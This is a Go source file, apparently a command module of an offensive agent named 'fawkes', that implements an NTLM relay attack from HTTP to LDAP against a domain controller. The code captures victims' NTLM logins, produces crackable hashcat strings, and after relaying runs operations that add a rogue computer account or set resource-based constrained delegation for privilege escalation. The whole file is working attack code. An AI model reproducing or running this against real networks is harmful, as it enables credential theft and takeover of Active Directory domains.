package commands

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

const (
	ldapRelayMaxDuration = 600
	ldapRelayDefaultPort = 389
	ldapRelayHTTPPort    = 80
	ldapRelayTimeout     = 30 * time.Second
)

type ldapRelayResult struct {
	Duration   string            `json:"duration"`
	ListenPort int               `json:"listen_port"`
	Target     string            `json:"target"`
	TargetPort int               `json:"target_port"`
	Operation  string            `json:"operation"`
	Relays     []*ldapRelayEntry `json:"relays"`
	Errors     []string          `json:"errors,omitempty"`
}

type ldapRelayEntry struct {
	Timestamp int64  `json:"timestamp"`
	VictimIP  string `json:"victim_ip"`
	Username  string `json:"username"`
	Domain    string `json:"domain"`
	Target    string `json:"target"`
	Success   bool   `json:"success"`
	Hashcat   string `json:"hashcat,omitempty"`
	Status    string `json:"status"`
	Detail    string `json:"detail,omitempty"`
	OpResult  string `json:"op_result,omitempty"`
}

type ldapRelayOps struct {
	target     string
	targetPort int
	listenPort int
	duration   int
	operation  string // "add-computer", "rbcd", "whoami"
	opTarget   string // target DN or account for the operation
	opValue    string // value for the operation (e.g., SID for RBCD)
}

func parseLDAPRelayOps(params sniffParams) ldapRelayOps {
	p := ldapRelayOps{
		target:     params.ResponseIP,
		targetPort: ldapRelayDefaultPort,
		listenPort: ldapRelayHTTPPort,
		duration:   120,
		operation:  "whoami",
	}

	if params.Duration > 0 {
		p.duration = params.Duration
	}
	if p.duration > ldapRelayMaxDuration {
		p.duration = ldapRelayMaxDuration
	}

	if params.Ports != "" {
		parts := strings.SplitN(params.Ports, ":", 2)
		if len(parts) == 2 {
			_, _ = fmt.Sscanf(parts[0], "%d", &p.listenPort)
			_, _ = fmt.Sscanf(parts[1], "%d", &p.targetPort)
		} else {
			_, _ = fmt.Sscanf(parts[0], "%d", &p.targetPort)
		}
	}

	// Parse protocols field for operation: "add-computer:MYPC$" or "rbcd:CN=target,DC=..."
	if params.Protocols != "" {
		parts := strings.SplitN(params.Protocols, ":", 2)
		p.operation = strings.ToLower(parts[0])
		if len(parts) > 1 {
			opParts := strings.SplitN(parts[1], "|", 2)
			p.opTarget = opParts[0]
			if len(opParts) > 1 {
				p.opValue = opParts[1]
			}
		}
	}

	return p
}

func executeLDAPRelayCore(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[sniffParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.ResponseIP == "" {
		return errorf("ldap-relay target required: set response_ip to the target LDAP server (DC)")
	}

	ops := parseLDAPRelayOps(params)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(ops.duration)*time.Second)
	defer cancel()

	result := &ldapRelayResult{
		ListenPort: ops.listenPort,
		Target:     ops.target,
		TargetPort: ops.targetPort,
		Operation:  ops.operation,
	}
	var mu sync.Mutex
	start := time.Now()

	listenAddr := fmt.Sprintf(":%d", ops.listenPort)
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		return errorf("bind HTTP %s: %v", listenAddr, err)
	}
	defer listener.Close()

	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return
				default:
					continue
				}
			}
			go handleLDAPRelayConn(ctx, conn, ops, &mu, result)
		}
	}()

	<-ctx.Done()
	result.Duration = fmt.Sprintf("%.1fs", time.Since(start).Seconds())

	var credentials []*sniffCredential
	for _, r := range result.Relays {
		cred := &sniffCredential{
			Protocol:  "ntlmv2-ldap-relay",
			SrcIP:     r.VictimIP,
			DstIP:     ops.target,
			DstPort:   uint16(ops.targetPort),
			Username:  r.Username,
			Timestamp: r.Timestamp,
			Detail: fmt.Sprintf("LDAP relay %s | target=%s:%d | op=%s | status=%s",
				r.Status, ops.target, ops.targetPort, ops.operation, r.Status),
		}
		if r.Hashcat != "" {
			cred.Password = r.Hashcat
		}
		if r.Domain != "" {
			cred.Username = r.Domain + "\\" + r.Username
		}
		credentials = append(credentials, cred)
	}

	output := struct {
		*ldapRelayResult
		Credentials []*sniffCredential `json:"credentials"`
	}{
		ldapRelayResult: result,
		Credentials:     credentials,
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("marshal result: %v", err)
	}

	return structs.CommandResult{
		Completed: true,
		Output:    string(jsonBytes),
	}
}

func handleLDAPRelayConn(ctx context.Context, conn net.Conn, ops ldapRelayOps, mu *sync.Mutex, result *ldapRelayResult) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(60 * time.Second))

	victimAddr, ok := conn.RemoteAddr().(*net.TCPAddr)
	if !ok {
		return
	}
	buf := make([]byte, 16384)

	entry := &ldapRelayEntry{
		Timestamp: time.Now().Unix(),
		VictimIP:  victimAddr.IP.String(),
		Target:    ops.target,
		Status:    "error",
	}
	defer func() {
		mu.Lock()
		result.Relays = append(result.Relays, entry)
		mu.Unlock()
	}()

	// Step 1: Get NTLM Type 1 from victim via HTTP 401
	n, err := conn.Read(buf)
	if err != nil {
		entry.Detail = fmt.Sprintf("read initial request: %v", err)
		return
	}

	ntlmData := extractHTTPNTLMAuth(string(buf[:n]))
	if ntlmData == nil {
		sendHTTP401NTLM(conn, "")
		n, err = conn.Read(buf)
		if err != nil {
			entry.Detail = fmt.Sprintf("read Type 1 request: %v", err)
			return
		}
		ntlmData = extractHTTPNTLMAuth(string(buf[:n]))
	}

	if ntlmData == nil {
		entry.Detail = "no NTLM data in request"
		return
	}

	if err := relayNTLMValidate(ntlmData, ntlmTypeNegotiate); err != nil {
		entry.Detail = fmt.Sprintf("invalid Type 1: %v", err)
		return
	}

	select {
	case <-ctx.Done():
		entry.Detail = "context cancelled before relay"
		return
	default:
	}

	// Step 2: Connect to target LDAP and relay Type 1
	lc, err := ldapRelayDial(ops.target, ops.targetPort, ldapRelayTimeout)
	if err != nil {
		entry.Detail = fmt.Sprintf("connect LDAP: %v", err)
		return
	}
	defer lc.close()

	type2Bytes, err := lc.negotiate(ntlmData)
	if err != nil {
		entry.Detail = fmt.Sprintf("LDAP NTLM negotiate: %v", err)
		return
	}

	// Extract raw NTLM if wrapped in SPNEGO
	if ntlm := spnegoExtractNTLMToken(type2Bytes); ntlm != nil {
		type2Bytes = ntlm
	}

	if err := relayNTLMValidate(type2Bytes, ntlmTypeChallenge); err != nil {
		entry.Detail = fmt.Sprintf("invalid LDAP Type 2: %v", err)
		return
	}

	// Step 3: Forward Type 2 to victim
	type2B64 := base64.StdEncoding.EncodeToString(type2Bytes)
	sendHTTP401NTLM(conn, type2B64)

	// Step 4: Get Type 3 from victim
	n, err = conn.Read(buf)
	if err != nil {
		entry.Detail = fmt.Sprintf("read Type 3 request: %v", err)
		return
	}

	type3Data := extractHTTPNTLMAuth(string(buf[:n]))
	if type3Data == nil {
		entry.Detail = "no NTLM Type 3 in final request"
		return
	}

	if err := relayNTLMValidate(type3Data, ntlmTypeAuthenticate); err != nil {
		entry.Detail = fmt.Sprintf("invalid Type 3: %v", err)
		return
	}

	user, domain := relayExtractType3Info(type3Data)
	entry.Username = user
	entry.Domain = domain

	serverChallenge := relayExtractType2Challenge(type2Bytes)
	if serverChallenge != nil {
		entry.Hashcat = relayBuildNTLMv2Hashcat(type3Data, serverChallenge)
	}

	// Step 5: Complete LDAP NTLM bind with Type 3
	err = lc.authenticate(type3Data)
	if err != nil {
		entry.Status = "logon_failure"
		entry.Detail = fmt.Sprintf("LDAP NTLM auth failed: %v", err)
		_, _ = conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"))
		return
	}

	entry.Success = true
	entry.Status = "authenticated"
	entry.Detail = fmt.Sprintf("Relayed %s\\%s to LDAP %s:%d", domain, user, ops.target, ops.targetPort)

	// Step 6: Perform post-auth LDAP operation using go-ldap over the existing TCP connection
	opResult := executeLDAPRelayOperation(lc.conn, ops)
	if opResult != "" {
		entry.OpResult = opResult
		entry.Detail += " | " + opResult
	}

	_, _ = conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"))
}

// executeLDAPRelayOperation performs a post-auth LDAP operation using the
// already-authenticated TCP connection. Creates a go-ldap client on top of
// the existing connection for high-level LDAP operations.
func executeLDAPRelayOperation(rawConn net.Conn, ops ldapRelayOps) string {
	// Wrap the already-authenticated TCP connection in a go-ldap Conn
	ldapConn := ldap.NewConn(rawConn, false)
	ldapConn.Start()

	switch ops.operation {
	case "whoami":
		return ldapRelayWhoami(ldapConn)
	case "add-computer":
		return ldapRelayAddComputer(ldapConn, ops.opTarget)
	case "rbcd":
		return ldapRelaySetRBCD(ldapConn, ops.opTarget, ops.opValue)
	default:
		return fmt.Sprintf("unknown operation: %s (available: whoami, add-computer, rbcd)", ops.operation)
	}
}

func ldapRelayWhoami(conn *ldap.Conn) string {
	result, err := conn.WhoAmI(nil)
	if err != nil {
		return fmt.Sprintf("whoami failed: %v", err)
	}
	if result.AuthzID != "" {
		return fmt.Sprintf("whoami: %s", result.AuthzID)
	}
	return "whoami: authenticated (empty response)"
}

func ldapRelayAddComputer(conn *ldap.Conn, computerName string) string {
	if computerName == "" {
		computerName = "FAWKESPC$"
	}
	if !strings.HasSuffix(computerName, "$") {
		computerName += "$"
	}

	baseDN, err := ldapRelayDiscoverBaseDN(conn)
	if err != nil {
		return fmt.Sprintf("discover base DN: %v", err)
	}

	samName := computerName
	dnName := strings.TrimSuffix(computerName, "$")
	computerDN := fmt.Sprintf("CN=%s,CN=Computers,%s", dnName, baseDN)
	dnsName := strings.ToLower(dnName) + "." + ldapRelayDNToDomain(baseDN)

	addReq := ldap.NewAddRequest(computerDN, nil)
	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
	addReq.Attribute("cn", []string{dnName})
	addReq.Attribute("sAMAccountName", []string{samName})
	addReq.Attribute("userAccountControl", []string{"4096"})
	addReq.Attribute("dNSHostName", []string{dnsName})

	err = conn.Add(addReq)
	if err != nil {
		return fmt.Sprintf("add-computer %s failed: %v", computerName, err)
	}
	return fmt.Sprintf("add-computer SUCCESS: created %s at %s", computerName, computerDN)
}

func ldapRelaySetRBCD(conn *ldap.Conn, targetDN, attackerSID string) string {
	if targetDN == "" {
		return "rbcd: target DN required (set protocols to 'rbcd:CN=target,...|S-1-5-21-...')"
	}
	if attackerSID == "" {
		return "rbcd: attacker SID required (set protocols to 'rbcd:targetDN|attackerSID')"
	}

	sidBytes, err := parseSIDString(attackerSID)
	if err != nil {
		return fmt.Sprintf("rbcd: invalid SID %q: %v", attackerSID, err)
	}
	sd := buildRBCDSecurityDescriptor(sidBytes)
	if sd == nil {
		return "rbcd: failed to build security descriptor for SID"
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd)})

	err = conn.Modify(modReq)
	if err != nil {
		return fmt.Sprintf("rbcd modify failed: %v", err)
	}
	return fmt.Sprintf("rbcd SUCCESS: set msDS-AllowedToActOnBehalfOfOtherIdentity on %s", targetDN)
}

func ldapRelayDiscoverBaseDN(conn *ldap.Conn) (string, error) {
	sr, err := conn.Search(ldap.NewSearchRequest(
		"", ldap.ScopeBaseObject, ldap.NeverDerefAliases, 1, 10, false,
		"(objectClass=*)", []string{"defaultNamingContext"}, nil))
	if err != nil {
		return "", err
	}
	if len(sr.Entries) == 0 {
		return "", fmt.Errorf("no rootDSE entry found")
	}
	dn := sr.Entries[0].GetAttributeValue("defaultNamingContext")
	if dn == "" {
		return "", fmt.Errorf("defaultNamingContext not found in rootDSE")
	}
	return dn, nil
}

func ldapRelayDNToDomain(baseDN string) string {
	var parts []string
	for _, rdn := range strings.Split(baseDN, ",") {
		rdn = strings.TrimSpace(rdn)
		if strings.HasPrefix(strings.ToUpper(rdn), "DC=") {
			parts = append(parts, rdn[3:])
		}
	}
	return strings.Join(parts, ".")
}
